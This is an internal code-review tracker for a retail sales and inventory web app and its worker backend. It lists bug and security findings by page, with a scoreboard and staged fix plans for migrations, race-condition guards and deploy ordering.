# Code review — page by page (2026-09-22)

> **Status: partial, and mostly unverified.** The review was stopped early to save usage.
>
> - **Reviewed (15 of 20 units):** Dashboard, Store Detail + All Stores Detail, Retail Summary, Inventory (Add / Viewer / Sale), Bin Dump, Opportunity Buys + MOS, Supply Request, Content + Flow Calendar, Merchandising tables (Manifests, Coverage, Products, Velocity, Buy Criteria, Shelf Count), Price Scan, eBay Cases, Login, Settings, Accessibility, Landing, No-access, Admin Settings (Repair console, costs, overrides), Worker core (Clover fetching, snapshots, rollups), Worker crons, briefings, push, sale scheduler.
> - **Not reviewed yet:** App shell / navigation / service worker / initial load, Labor, Inventory Receiver, Submit Photos + Marketing + Comments, Users & access.
> - **Verified:** only *Worker crons* (all 15 findings confirmed by an independent verifier). **Every other finding below is one reviewer's claim.** The one verified unit came back 15/15, so the reviews look reliable, but re-check each finding against the code before fixing it.
> - **The review itself changed no code.** Every finding is either **minor** (local, frontend-only or self-contained, no API/schema/deploy coupling) or **major** (needs a plan: cross-cutting, frontend+worker coordination, schema, or destructive-path work).
> - **Fixed since (2026-09-23):** 14 Bin Dump findings — bin-dump-1, 2, 3, 4, 7, 10, 11, 12, 13, 14, 15, 20, 22, 23 — each checked against the code before fixing; marked in the Bin Dump table. Also oppbuys-mos-2, oppbuys-mos-3 and oppbuys-mos-11, and the lookup half of oppbuys-mos-4, marked in the Opportunity Buys + MOS table. On 2026-09-24, merch-price-scan-8 (Price Scan's copy of the oppbuys-mos-2 race) and merch-price-scan-20 (the camera kept running in the background; MOS's scanner is covered by the same fix), marked in the Price Scan table. Also on 2026-09-24, with the Viewer's delete: inventory-5, inventory-24, inventory-8, and inventory-1 in part (the Viewer rows, Edit, and Schedule Sale's chips, preview and log); later that day the rest of inventory-1 (Add Item's "Open in Viewer", and the Viewer's and Edit's error strips). All marked in the Inventory table. See `tasks/todo.md`.

## How to pick this up

1. Finish the five unreviewed units, then verify the rest. Hand an agent a page's section below and ask it to refute each finding against the current code.
2. Fix **high + minor + verified** first. Most are one-function changes: escaping, error handling, missing guards.
3. For each **major** item, follow its plan in *Major items* below. Worker changes need an explicit `wrangler deploy`. Derive deploy order from which side stops being backward-compatible (CLAUDE.md rule 6).

## Scoreboard

| Page | Findings | High | Medium | Low | Minor | Major |
|---|---:|---:|---:|---:|---:|---:|
| [Dashboard](#dashboard) | 28 | 8 | 12 | 8 | 25 | 3 |
| [Store Detail + All Stores Detail](#store-detail) | 28 | 6 | 12 | 10 | 28 | 0 |
| [Retail Summary](#weekly-retail) | 24 | 3 | 11 | 10 | 23 | 1 |
| [Inventory (Add / Viewer / Sale)](#inventory) | 29 | 6 | 16 | 7 | 27 | 2 |
| [Bin Dump](#bin-dump) | 27 | 1 | 10 | 16 | 26 | 1 |
| [Opportunity Buys + MOS](#oppbuys-mos) | 25 | 1 | 11 | 13 | 23 | 2 |
| [Supply Request](#supply-request) | 30 | 3 | 14 | 13 | 28 | 2 |
| [Content + Flow Calendar](#content-flow) | 23 | 2 | 15 | 6 | 20 | 3 |
| [Merchandising tables (Manifests, Coverage, Products, Velocity, Buy Criteria, Shelf Count)](#merch-buying) | 39 | 3 | 25 | 11 | 35 | 4 |
| [Price Scan](#merch-price-scan) | 21 | 2 | 13 | 6 | 18 | 3 |
| [eBay Cases](#ebay-cases) | 22 | 2 | 9 | 11 | 20 | 2 |
| [Login, Settings, Accessibility, Landing, No-access](#auth-settings) | 27 | 3 | 15 | 9 | 26 | 1 |
| [Admin Settings (Repair console, costs, overrides)](#admin-settings) | 29 | 5 | 16 | 8 | 25 | 4 |
| [Worker core (Clover fetching, snapshots, rollups)](#worker-core) | 22 | 10 | 7 | 5 | 17 | 5 |
| [Worker crons, briefings, push, sale scheduler](#worker-cron-notify) | 15 | 5 | 4 | 6 | 14 | 1 |
| **Total** | **389** | **60** | **190** | **139** | **355** | **34** |

## Every high-severity finding

| Page | ID | Size | Category | Finding |
|---|---|---|---|---|
| Dashboard | [dashboard-1](#dashboard-1) | minor | bug | Matrix tiles (hero + every store card) freeze at first-load values; refresh updates Net but never Cart/Items/Orders/ASP |
| Dashboard | [dashboard-2](#dashboard-2) | minor | bug | Live Clover failures are swallowed, so the 'not reporting — pace unavailable' guard, the card error state and the offline alert are dead code |
| Dashboard | [dashboard-4](#dashboard-4) | minor | bug | No refresh on app resume or at ET midnight: the installed PWA keeps showing 'Today' for a day that has ended |
| Dashboard | [dashboard-5](#dashboard-5) | minor | bug | Hourly Snapshot (push-notification target) shows whatever live data is in memory, stamped with the current time and 'Live' |
| Dashboard | [dashboard-7](#dashboard-7) | minor | bug | Live fetch sends browser-local midnight as `since`; the worker trusts it and writes the result as today's ET snapshot (D1 daily_sales + KV) |
| Dashboard | [dashboard-8](#dashboard-8) | minor | bug | Snapshot-on-fetch overwrites a same-day manual override, and the kept flag then freezes the clobbered value permanently |
| Dashboard | [dashboard-9](#dashboard-9) | major | bug | Year-rollover time bomb: history is fetched with a hard-coded to=2026-12-31, and weeks are keyed by a label that repeats each year |
| Dashboard | [dashboard-10](#dashboard-10) | major | bug | ?action=snapshot re-pulls any date with no backup or partial-fetch guard, and a one-click admin button runs it over 91 days for all stores |
| Store Detail + All Stores Detail | [store-detail-1](#store-detail-1) | minor | bug | Current-week hero: Channel Mix and Matrix show TODAY's live figures under a 'This Week' label and compare them with last week's week-to-date totals |
| Store Detail + All Stores Detail | [store-detail-2](#store-detail-2) | minor | bug | All Stores page leaves auction out of its hero, By-Store rows and chart, but its budgets and the dashboard card that opens it include auction |
| Store Detail + All Stores Detail | [store-detail-3](#store-detail-3) | minor | bug | Transactions: a slow response for the previous store or day overwrites the newer selection |
| Store Detail + All Stores Detail | [store-detail-4](#store-detail-4) | minor | bug | Item Sales (both pages): switching day or store while a load is in flight lets the older response overwrite the table |
| Store Detail + All Stores Detail | [store-detail-5](#store-detail-5) | minor | bug | Chart cards compare this week so far with the whole of last week, last year and the budget ('vs Last Week −66%' every Tuesday) |
| Store Detail + All Stores Detail | [store-detail-6](#store-detail-6) | minor | bug | Week-view Item Sales caches are not tied to the week on screen: All Stores reopens an old week, and store-detail drill/sort picks the first cached week |
| Retail Summary | [weekly-retail-1](#weekly-retail-1) | minor | bug | A failed Retail Summary load hides its own error and leaves the previous range's numbers under the new range chip |
| Retail Summary | [weekly-retail-2](#weekly-retail-2) | minor | bug | Categories 'Vs' counts today's not-yet-written snapshot as $0, so the default This Week view reports a false decline |
| Retail Summary | [weekly-retail-3](#weekly-retail-3) | minor | bug | T13 Net card '% Budget' divides only the 12 merchandise categories by the full chain budget |
| Inventory | [inventory-1](#inventory-1) | minor | security | Stored XSS / broken Edit: Clover item names interpolated into HTML attributes without quote escaping (incl. JSON in a single-quoted onclick) **Fixed 2026-09-24.** |
| Inventory | [inventory-2](#inventory-2) | minor | bug | create-clover-item overwrites the shared IM# cost table and writes a global L3 mapping even when nothing was created |
| Inventory | [inventory-3](#inventory-3) | minor | bug | Overlapping loadInventory calls share one global array: a double-click on Load doubles the catalog and flags every code as a duplicate |
| Inventory | [inventory-4](#inventory-4) | minor | bug | Saving the Edit modal overwrites the item's `sku` with `code`, and wipes both when the code is empty |
| Inventory | [inventory-5](#inventory-5) | minor | bug | Delete is unreachable: the redesign dropped the row's Del button, so openDeleteModal has no caller **Fixed 2026-09-24.** |
| Inventory | [inventory-6](#inventory-6) | minor | bug | Schedule Sale offers six locations but sends one store's Clover item ids; every other store's rows fail at activation |
| Bin Dump | [bin-dump-1](#bin-dump-1) | minor | security | escapeHtml inside value="" / title="" attributes: values with a double quote are cut short on save, and attributes can be injected (stored XSS) **Fixed 2026-09-23.** |
| Opportunity Buys + MOS | [oppbuys-mos-1](#oppbuys-mos-1) | major | bug | Buy 'Sold' counts every sale of an ordinary (non-PO) code printed under the buy, across all stores |
| Supply Request | [supply-request-1](#supply-request-1) | minor | security | Stored XSS: item quantity/unit are rendered raw in request detail (any manager → superuser session) |
| Supply Request | [supply-request-3](#supply-request-3) | minor | bug | Deleting a user cascades away every supply request they submitted, including the spend the Budget and Reports tabs sum |
| Supply Request | [supply-request-4](#supply-request-4) | minor | bug | Reports asks for limit=1000 but the worker caps at 200 (urgent first), so monthly spend, KPIs, All Requests and CSV are silently truncated |
| Content + Flow Calendar | [content-flow-1](#content-flow-1) | minor | security | photo/thumbnail endpoints serve the uploader-declared Content-Type (SVG) from the API origin with no nosniff/CSP: stored XSS from any signed-in user |
| Content + Flow Calendar | [content-flow-2](#content-flow-2) | minor | bug | Staged posts (status 'approved') come back to Drafts with Publish/Edit: duplicate public post, or a reschedule marked Published without ever posting live |
| Merchandising tables | [merch-buying-1](#merch-buying-1) | minor | bug | xlsx parser: a self-closing empty cell swallows the next cell, shifting values into the wrong columns without any error |
| Merchandising tables | [merch-buying-2](#merch-buying-2) | minor | bug | Products: saving any product whose identifier is a model number fails with 'No such product' |
| Merchandising tables | [merch-buying-3](#merch-buying-3) | minor | bug | The 'Landed cost' headline leaves out freight, and the list's 'Landed cost' for the same manifest is a different number |
| Price Scan | [merch-price-scan-1](#merch-price-scan-1) | major | bug | sticker-create-price-point duplicate guard is an unlocked read-then-write per store, so concurrent callers still create duplicate Clover items |
| Price Scan | [merch-price-scan-4](#merch-price-scan-4) | minor | ui-ux | iPhone numeric keypad on the scan box leaves no way to type a product description |
| eBay Cases | [ebay-cases-1](#ebay-cases-1) | minor | security | Handler-supplied ebay_url is written into href with an escaper that leaves quotes alone, so attributes can be injected (XSS) |
| eBay Cases | [ebay-cases-2](#ebay-cases-2) | minor | bug | The page never refetches on revisit or push tap, and the staleness banner then blames Handler for the page's own stale data |
| Login, Settings, Accessibility, Landing, No-access | [auth-settings-1](#auth-settings-1) | minor | security | Email OTP can be brute-forced: no attempt limit, unlimited live codes per email, Math.random codes |
| Login, Settings, Accessibility, Landing, No-access | [auth-settings-2](#auth-settings-2) | minor | bug | No-access (and landing) page has no Sign out: sidebar and bottom bar are hidden, so the account is stuck |
| Login, Settings, Accessibility, Landing, No-access | [auth-settings-6](#auth-settings-6) | minor | bug | History request is hard-coded to end 2026-12-31: from 1 Jan 2027 the landing figures (and the dashboard) have no rows |
| Admin Settings | [admin-settings-1](#admin-settings-1) | major | bug | items-snapshot and snapshot overwrite KV/D1 history with no magnitude guard and no backup |
| Admin Settings | [admin-settings-2](#admin-settings-2) | minor | bug | Four bulk re-pull buttons run with no confirmation and no in-flight guard |
| Admin Settings | [admin-settings-3](#admin-settings-3) | minor | bug | Saving category overrides wipes the entire override map when the read-before-write fails |
| Admin Settings | [admin-settings-4](#admin-settings-4) | minor | bug | L3 rule removal is by stale index, so a second save deletes a different rule |
| Admin Settings | [admin-settings-5](#admin-settings-5) | major | bug | Manual Labor Hours locks the whole store-day row, so that day's sales and budget stop updating |
| Worker core | [worker-core-1](#worker-core-1) | minor | bug | Retail week 1 (crossing the calendar year) is summed as the WHOLE calendar year by buildStoreWeekly's [min,max] range query |
| Worker core | [worker-core-2](#worker-core-2) | major | bug | resolveWeekDates and the nightly week rollup pick the wrong dates, and the wrong KV year, for the week that crosses a year boundary |
| Worker core | [worker-core-3](#worker-core-3) | minor | security | Live ?store= route writes unguarded snapshots: overwrites manual-override rows and honours a caller-supplied `since` |
| Worker core | [worker-core-4](#worker-core-4) | minor | bug | Sale scheduler: one transient Clover error at revert time leaves the item on sale permanently, and nothing is logged |
| Worker core | [worker-core-5](#worker-core-5) | minor | bug | Sale scheduler has no claim step: overlapping runs compound the discount and corrupt original_price |
| Worker core | [worker-core-6](#worker-core-6) | minor | bug | Transaction archive banks a day as complete=1 even when the /v3/refunds or /v3/credits fetch failed |
| Worker core | [worker-core-7](#worker-core-7) | major | bug | Snapshot writers treat a failed refunds or credits fetch as 'no refunds' and write inflated totals; no guard catches over-statement |
| Worker core | [worker-core-8](#worker-core-8) | minor | bug | snapshotDayByClientTime overwrites the item snapshot after the zero-order guard refused the sales write, and reports 'skipped' |
| Worker core | [worker-core-9](#worker-core-9) | major | bug | Nightly clientCreatedTime sweep re-pulls two healthy prior days with no magnitude guard, so a short Clover fetch overwrites D1 and KV |
| Worker core | [worker-core-10](#worker-core-10) | major | bug | Fully refunded same-day orders are dropped by the `order.total <= 0` skip and then their refund is subtracted again |
| Worker crons, briefings, push, sale scheduler | [worker-cron-notify-1](#worker-cron-notify-1) | minor | bug | Sale scheduler has no claim: two overlapping ticks double-discount the item and save the sale price as the original |
| Worker crons, briefings, push, sale scheduler | [worker-cron-notify-2](#worker-cron-notify-2) | minor | bug | A failed sale revert is final and silent: the item stays discounted, nothing retries, nobody is alerted, and the UI's only button deletes the original price |
| Worker crons, briefings, push, sale scheduler | [worker-cron-notify-3](#worker-cron-notify-3) | minor | bug | Weekly digest 'Net Sales' leaves out auction revenue but is compared against a budget that includes it |
| Worker crons, briefings, push, sale scheduler | [worker-cron-notify-4](#worker-cron-notify-4) | minor | bug | Hourly 'Sales Update' push reads today's D1 row, which only a dashboard visit refreshes; it shows stale or $0 figures under the current time |
| Worker crons, briefings, push, sale scheduler | [worker-cron-notify-6](#worker-cron-notify-6) | minor | bug | Daily summary email drops closed Holland's budget from its by-store total and disagrees with its own Daily Breakdown; stores that did not report are silently left out |

## Major items — the plan for later

These should not be patched ad hoc. Each has the reviewer's proposed plan; verify it before starting.

### Dashboard

- **[dashboard-9](#dashboard-9) — Year-rollover time bomb: history is fetched with a hard-coded to=2026-12-31, and weeks are keyed by a label that repeats each year** (high, bug, `index.html:8066`)  
  *Plan:* Future plan, frontend only, so there is no deploy ordering. (1) Ship now: derive the bounds from the ET year (from = `${y-1}-01-01`, to = `${y}-12-31`). This is safe on its own only if pre-2026 rows carry no week label; confirm read-only with `SELECT COUNT(*) FROM daily_sales WHERE date < '2026-01-01' AND week IS NOT NULL`. (2) Before December: replace label-keyed week filters with a date window (the Sun–Sat retail week containing the anchor date, via the existing ymdSundayOf), or with a per-row composite `${year}|${week}` key. That covers the Weekly card, getStoreMetrics, getLastWeekRows/allWeeks, the store-detail selectors and _asWeekTotals. Risk: the sheet's week must really be Sun–Sat (the comment at 8424 says it is). Verify with the stubbed browser probe: rows spanning 2026-12-20..2027-01-10 with repeated labels, clock set to 2027-01-02, and assert Weekly equals one week's sum.

- **[dashboard-10](#dashboard-10) — ?action=snapshot re-pulls any date with no backup or partial-fetch guard, and a one-click admin button runs it over 91 days for all stores** (high, bug, `worker.js:18737`)  
  *Plan:* Future plan. Frontend first, because removing or re-routing a caller works against either worker: remove the 13-week button, or make it consume repair-health output the way the Repair console does, and add uiConfirm plus a store/date summary to the month re-snapshot. Worker second, because it stops the old button's happy path: for date !== today, route ?action=snapshot through rebuildItemSnapshot (backup plus ratio guard), or return 409 pointing to repair-run. Risk: the SRR month-compare tool loses its fix button, so hand it the health-check flow. Verify with the worker harness: existing D1 total 3229.91 and stubbed Clover returning 60% of the orders; assert the D1 row and the items: KV are unchanged and a backup exists. Control: a genuinely short snapshot still gets repaired.

- **[dashboard-19](#dashboard-19) — Hourly sparkline costs one full Clover order pull per store per render, including immutable past dates** (medium, performance, `worker.js:27403`)  
  *Plan:* (1) Worker only, backward compatible, deployable any time: for date < today serve from item-hours:<store>:<date> when present, otherwise cache the computed response in caches.default for 24h, after canAccessStore. (2) Frontend + worker: have the live handler also return `hours` (it already holds the day's elements) and read today's spark from liveCloverData. Deploy the worker first (an additive field), then the frontend. (3) Align the hourly net with aggregateOrders' definition. Verify: probe hourly count 0 for Today, and a harness assertion that sum(hours) equals aggregate.total within rounding.

### Retail Summary

- **[weekly-retail-24](#weekly-retail-24) — T13, Summary matrix and store detail tables don't follow DESIGN §4.8 (no legend for the heat tint, no level badges or sticky header, legacy gray palette)** (low, ui-ux, `index.html:22393`)  
  *Plan:* FUTURE PLAN (frontend only; no worker or API change, so there is no deploy-order constraint and Pages publishes on merge). 1) Move the T13 cards and store table styles into a `wrs-` stylesheet built from the §4.8 token literals, both themes stated on the panel, reusing #ct-tbl's rules (sticky thead, sticky .k column with an opaque bg, .ct-l3 ::before rule, .mc-lvl badges). 2) Give each card a bar (label + its controls: Expand all, Contribution/Penetration; move the T13 store chips into the first card's bar) and a legend row (heat tint = share of the largest cell on this card; '—' = no sales; italic = uncategorised remainder). 3) Swap the store detail table's gray-* classes for op/opl tokens. 4) Exporters read `<table>`, so keep the markup a <table> and re-run the CSV/PDF on T13 and a store tab. Risks: exporter selectors (`.rounded-xl` / `bg-gray-50` total detection at 15389/15404) depend on the current classes, so update them in the same change. Verify: contrast computed on panel/panelHi in light, dark and OLED (≥4.5:1); browser harness at 393 px and 1280 px; §4.8 traps 2, 3, 7 and 8 (sticky bg, colour on the panel, second render after an expand toggle).

### Inventory (Add / Viewer / Sale)

- **[inventory-22](#inventory-22) — Sale activation/revert is not idempotent: rows aren't claimed before the Clover write, so overlapping runs or a failed D1 update double-discount and later 'revert' to the sale price** (low, bug, `worker.js:1585`)  
  *Plan:* Future plan (worker; the frontend needs labels first). (1) Frontend first, inert: add 'activating'/'reverting' to SCHED_STATUS_LABEL and SCHED_STATUS_CLASS so the new statuses read correctly. (2) Worker: claim each row with `UPDATE sale_schedules SET status='activating' WHERE id=? AND status='pending'` and continue only when meta.changes === 1. Make the final update `WHERE id=? AND status='activating'`, and if a cancel won, revert immediately. Do the same for revert. (3) Recovery: a row left in 'activating' for more than 5 min re-reads Clover (SALE prefix present?) and settles to active or pending. Risks: stuck claims, and the list query's rank table needs the new statuses. Verify with the harness: run processSaleSchedules twice concurrently against a stub Clover and assert a single discount and one POST per item.

- **[inventory-23](#inventory-23) — create-clover-item's duplicate guard is still read-then-write with no lock: two concurrent submits (two tabs/admins, or a retry while the first is still running) can both create** (low, bug, `worker.js:19940`)  
  *Plan:* Future plan. (1) Migration first: `CREATE TABLE clover_create_locks(store TEXT, code TEXT, created_at TEXT, PRIMARY KEY(store, code))`. (2) Worker: `INSERT INTO clover_create_locks ...` before the scan; on a UNIQUE conflict with a lock younger than 2 min, return `{duplicate:false, stage:'in-progress'}` ('another create for this code is running'). Delete stale locks. Write the lock handling so it fails closed if the table is missing, and deploy it after the migration. (3) Optional frontend idempotency key. The frontend needs no change because it already renders unknown stages as failed. Verify with the harness: two concurrent requests against a stub Clover whose page read is delayed produce exactly one POST /items.

### Bin Dump

- **[bin-dump-6](#bin-dump-6) — Associates with an edit grant can approve their own duplicate pallet with a bare allow_duplicate boolean** (medium, security, `worker.js:24501`)  
  *Plan:* Future plan. Brian decides first whether associates may approve their own duplicate (if yes, fix the IR comment and pin the choice in a test). If no: (1) an additive migration adds dup_approved_by and dup_reason to bin_dumps. (2) Frontend: on a new 403 NEED_APPROVAL, show the manager-approval sheet the IR page uses (approvers list plus PIN), then resend with `approval:{name,pin}`. Old workers ignore the field, so this is safe to ship first. (3) Worker last, since it is the side that stops being backward-compatible for associate clients: when `!isAdminSecret && !canSeeFinancials(currentUser)`, ignore allow_duplicate and require an approval checked by the shared verifyApproval (hoisted above the Bin Dump handlers), recording the approver on the row. Risks: associates are blocked mid-unload when no manager is on site; cached old PWAs show a generic error until they reload. Verify with a test that an associate sending allow_duplicate gets 403 NEED_APPROVAL and a manager is unchanged, plus a browser run as an associate.

### Opportunity Buys + MOS

- **[oppbuys-mos-1](#oppbuys-mos-1) — Buy 'Sold' counts every sale of an ordinary (non-PO) code printed under the buy, across all stores** (high, bug, `worker.js:23840`)  
  *Plan:* FUTURE PLAN. (1) Frontend first, backward-compatible with the current worker, which never sends null: obSoldCell(n) renders 'not tracked' when n === null. obRenderDetail's sentence mentions 'N lines printed before the PO was in the code cannot be attributed' when the worker supplies that count. (2) Worker (ob-buy-detail): attribute only codes that carry this PO. Filter in JS with `mosParseCode(code)?.po === po`, or in SQL with `substr(code, -(length(?)+2)) = '-P' || ?`; do not use LIKE, because `_` and `.` are legal PO characters. Lines whose code lacks the marker return `sold: null, refunded_units: null`. totalSold sums only (store, code) pairs that appear in `lines`, and the response adds `unattributable_lines`. (3) Worker guard in sticker-printed: refuse a `po` whose code does not end in `-P<po>`, so no new rows can recreate this. Deploy order: frontend, then worker. Either order is safe (an old client shows the worker's null as '0', which is less wrong than 66), but frontend first avoids that confident 0. Risks: a PO containing '-P' inside itself. Parse with mosParseCode rather than string-splitting. Verify: add a block to test-opportunity-buys.mjs with an ordinary-code print on the PO and ordinary sales at two stores; assert sold excludes them and the line's sold is null. The browser check asserts that cell reads 'not tracked'.

- **[oppbuys-mos-15](#oppbuys-mos-15) — mos-update lets any page-edit account cut a recorded loss or move it out of Shrink, keeps no prior value, and the UI never shows the edit** (medium, security, `worker.js:25673`)  
  *Plan:* FUTURE PLAN, needs Brian's policy call. Options: (a) immediately and frontend-only, show 'edited by X · date' under the row's When cell, since edited_by/edited_at are already returned; (b) a worker-only added guard so non-financial roles may edit only rows they logged (logged_by === actorLabel) on the same ET day, with managers unchanged; (c) keep history with a migration adding orig_qty/orig_reason set on first edit, or a mos_edits table. Deploy order for (c): migration → worker (writes the new columns) → frontend (shows them), because the worker is the side that stops being compatible with an unmigrated DB. Verify with test-mos: an associate editing another person's row gets 403, and the original values survive an edit.

### Supply Request

- **[supply-request-14](#supply-request-14) — Purge and delete permanently erase requests and their recorded spend with no archive; the only undo is a whole-DB restore** (medium, bug, `worker.js:26704`)  
  *Plan:* Future plan. (1) Worker first; this is additive and backward-compatible. Before the DELETE batch, SELECT the matched requests with their items and history and write them as one JSON object to R2 at `supply-purge/<iso>-<userId>.json`. Treat a failed put as a failed purge: return 500 and delete nothing. Add `archive` to the response, and do the same for single delete. (2) Optional schema step: add a `supply_spend_monthly` rollup written at purge time, and have supply-budgets and Reports read rollup plus live rows. Deploy the migration first, then the worker that reads both; the frontend needs no change. (3) Frontend: show the archive key in the success alert, and start with no status pre-checked. Risks: the ordering must be archive, then delete, in one batch; R2 size is trivial at this scale. To verify, use worker-harness with node:sqlite and a stubbed R2: an R2 failure gives 500 with 0 rows deleted, and on success the archive row counts equal deleted/items/history.

- **[supply-request-29](#supply-request-29) — Queue rows show only 'N items': the superuser must expand every request to see what is being asked for** (low, ui-ux, `index.html:12874`)  
  *Plan:* Future plan. (1) Worker first, additive: add `item_preview` to each supply-requests row, e.g. `(SELECT GROUP_CONCAT(item_name || ' ×' || quantity, ', ') FROM (SELECT … FROM supply_request_items WHERE request_id = r.id ORDER BY rowid LIMIT 3))`. The current frontend ignores unknown fields. (2) Frontend: render `escapeHtml(r.item_preview)` under the meta line, falling back to 'N items'. Deploy order: worker, then frontend, because the frontend consumes the new field. Verify with worker-harness that a BL1 manager's rows contain no other store's items, and that the preview is escaped on render.

### Content + Flow Calendar

- **[content-flow-13](#content-flow-13) — The composer's AI caption never sees the selected bin photos, only the cover (the 2026-08-26 lesson, through a second channel)** (medium, bug, `index.html:19189`)  
  *Plan:* Plan, safe in either deploy order. (1) Worker first: in draft-generate-caption, also pass `photoIds: Array.isArray(b.photo_ids) ? b.photo_ids : []`. An old frontend sends nothing and behaves exactly as today. (2) Frontend: add `photo_ids: [...ctSelPhotos]` to the body. The frontend change is inert against an old worker. Verify with test-bin-photo-autodraft-style stubs asserting that the Claude request's content carries photo blocks and no cover block when photos are selected. Risk: CAPTION_PHOTO_LIMIT already caps the images and cost.

- **[content-flow-14](#content-flow-14) — Everything is hard-coded to F26, which ends 2026-12-26; after that the photo folders, the 'Now' week, promo captions and the Flow Calendar all degrade silently** (medium, bug, `index.html:18656`)  
  *Plan:* Plan. (1) Data: add F27 marketing_flow and flow_segments rows (a migration, applied to staging then prod, with explicit confirmation per CLAUDE.md rule 7). (2) Worker: when `fy` is absent, resolve the fiscal year whose week range covers today; have flow-calendar return the list of available fiscal years; buildCaption resolves the week by date across all fiscal years. This is backward-compatible, so the worker deploys first. (3) Frontend: drop the literal 'F26', take fiscalYear from the response, add a fiscal-year switcher to the Flow Calendar header, derive the quarter headers from the week numbers, and have ctFlowSeed send the fy it loaded. (4) Verify by stubbing today as 2026-12-28 in node and checking folder keys and fcNowIdx. Risk: photo/published foldering spans two fiscal years, so ctFlowWeeks must hold both.

- **[content-flow-22](#content-flow-22) — The live preview is an Instagram mock-up (fake handle, 2,200 IG limit, caption below a 150-char cut), not what the Facebook Page post will look like** (low, ui-ux, `index.html:4334`)  
  *Plan:* Plan (a redesign, so major): return page_name with the thumbnails/drafts payload, or add a small `fb-pages` read. Reshape the preview as a Facebook Page post: avatar, page name and 'Just now · 🌐', caption ABOVE the media with a 'See more' cut at FB's ~3 lines or about 80 words, and a 1+N grid instead of a carousel. Replace the 2,200 counter with a word count against the 50–80 target. Frontend-only apart from exposing page_name, which is additive, so the worker goes first. Verify at 393px and 1280px in both themes.

### Merchandising tables (Manifests, Coverage, Products, Velocity, Buy Criteria, Shelf Count)

- **[merch-buying-12](#merch-buying-12) — Velocity's 'Year' window reads 1,820 KV snapshots per request, well past the ~1,000-per-invocation ceiling the repo designs around elsewhere** (medium, performance, `worker.js:26330`)  
  *Plan:* Future plan. (1) Stopgap, frontend-only and safe with any worker: remove `[364,'Year']` from VL_WINDOWS. (2) Worker: serve windows over ~120 days from per-store weekly aggregates. The weekly summaries writeWeekSummary already builds, or a small D1 table of units and baskets per store/week/L3 filled by the nightly cron, would do; 52 reads per store instead of 364. Keep the response shape identical so no frontend change is needed. Deploy the worker first, since the frontend only gains a window, and put Year back after the worker is verified. Risk: weekly basket counts cannot be summed across L3s (the l2Orders note at 14016-14019 applies), so store l2Orders as their own column. Verify with an offline test that counts env.SALES_SNAPSHOTS.get calls per window and asserts ≤ 840.

- **[merch-buying-23](#merch-buying-23) — Remapping a PDF sends it through Claude again, so the rows stored can differ from the rows the user confirmed** (medium, bug, `worker.js:22392`)  
  *Plan:* Future plan. Worker: on a PDF upload, store the parsed rows under a short-lived key (for example KV `manifest-rows:<id>` with a 24h TTL, deleted after a successful remap), and in manifest-remap use them when `format==='pdf'` and the key exists, falling back to re-reading otherwise. The frontend needs no change and keeps sending the file. Deploy the worker only; the change is backward-compatible because old clients still send file_b64. Risk: it briefly stores vendor pricing, which the code avoids today, so keep the TTL and delete on confirm. Verify on staging by uploading a PDF, remapping twice, confirming one Anthropic call in the logs, and checking the header lists are identical.

- **[merch-buying-25](#merch-buying-25) — The decision snapshot exceeds D1's ~2 MB value limit at around 1,250 lines, so large manifests cannot be decided** (medium, bug, `worker.js:22766`)  
  *Plan:* Future plan, worker-only but a stored-format change. (1) Update the read path first to accept either the current JSON or `{z:'gzip-b64', data}` (CompressionStream('gzip') + base64), or a pointer to an R2 object `manifest-snapshots/<id>.json`. (2) Then switch the write path to compress, or to R2 above 1.5 MB. Read must ship before write because the new format is not readable by old code. Also trim fields the frozen view never reads (manifest_id, retail_url, raw columns) from each line. Verify on staging by deciding a synthetic 5,000-line manifest and reopening it frozen.

- **[merch-buying-35](#merch-buying-35) — A wrong category or price on a manifest line can't be fixed from the Scorer, and Products edits don't reach lines already written** (medium, ui-ux, `worker.js:22549`)  
  *Plan:* Future plan, frontend-only because the endpoint already exists. Make the Category cell a button that opens an inline select of L3s (reuse the prState.cats tree from merch-products, or merchTree), and add an inline 'Suggested' price edit. POST to manifest-line and then call mfOpen(id). Disable both when m.decided_at is set. Change the Products copy to 'fixes future manifests and the next remap'. Verify: correct one line's category, check that the rollup moves it and the verdict re-scores, then confirm a new upload of the same UPC picks up the manual category.

### Price Scan

- **[merch-price-scan-1](#merch-price-scan-1) — sticker-create-price-point duplicate guard is an unlocked read-then-write per store, so concurrent callers still create duplicate Clover items** (high, bug, `worker.js:24311`)  
  *Plan:* FUTURE PLAN.
1. Migration (additive, inert for the current worker): `CREATE TABLE price_point_claims (store TEXT NOT NULL, code TEXT NOT NULL, claimed_by TEXT, claimed_at TEXT NOT NULL, item_id TEXT, PRIMARY KEY (store, code));`. Apply to staging and then prod D1 with explicit confirmation (MEMORY rule 7).
2. Worker: inside the per-store map, BEFORE cloverCodeInUse, take an atomic claim: `INSERT INTO price_point_claims (store, code, claimed_by, claimed_at) VALUES (?,?,?,?) ON CONFLICT(store, code) DO UPDATE SET claimed_by=excluded.claimed_by, claimed_at=excluded.claimed_at WHERE price_point_claims.item_id IS NULL AND price_point_claims.claimed_at < ? RETURNING store`, with a 2-minute staleness cutoff. D1 serialises writes, so exactly one caller wins. A loser answers `{ store, ok:false, stage:'in-progress', error:'Being created by another request right now — retry in a moment' }`, or `{ ok:true, existed:true }` if item_id is already set. On success, `UPDATE ... SET item_id=?`. On failure before the POST, DELETE the claim.
3. Deploy order: migration first (the old worker ignores the table), then the worker. No frontend change is needed: psPpMark already renders a per-store `error` on the row and offers Retry.
4. Risks: a stale claim if the invocation is cancelled mid-create (covered by the expiry); a crash between the POST and the UPDATE leaves item_id null, but the next caller's cloverCodeInUse still finds the item and answers existed.
5. Verify: extend test-price-scan's scripted-worker harness (around line 4336) to drive the real handler with two concurrent confirm calls for the same store against a Clover stub with latency. Assert exactly one POST /items. Run it against the current handler first and watch it fail (2 POSTs).

- **[merch-price-scan-7](#merch-price-scan-7) — UPC-E keys differently by input path, and 8-digit typos pass unchecked** (medium, bug, `index.html:23646`)  
  *Plan:* FUTURE PLAN.
1. Worker (deploy first):
   - merchCanonicalUpc expands an 8-digit code starting with 0/1 whose expanded UPC-A check digit verifies into that UPC-A. This needs a server copy of upcaFromUpce, pinned by test to index.html's.
   - merchIdForms also yields the raw 8-digit spelling, so rows cached under the old key are still read.
   - isPlausibleBarcode for 8 digits accepts a valid UPC-E (expanded check) or a valid EAN-8 (plain GTIN check), and nothing else.
   - Manifest matching: the obSheet query compares against ob_upc, so match both spellings (`ob_upc IN (?, ?)`) rather than backfilling. A backfill would be a D1 mutation needing explicit confirmation.
2. Frontend (either order afterwards; safe alone because it only refuses earlier): mirror the tightened 8-digit check in psScan and pmPrice, and optionally expand in the box so what is shown is the canonical key.
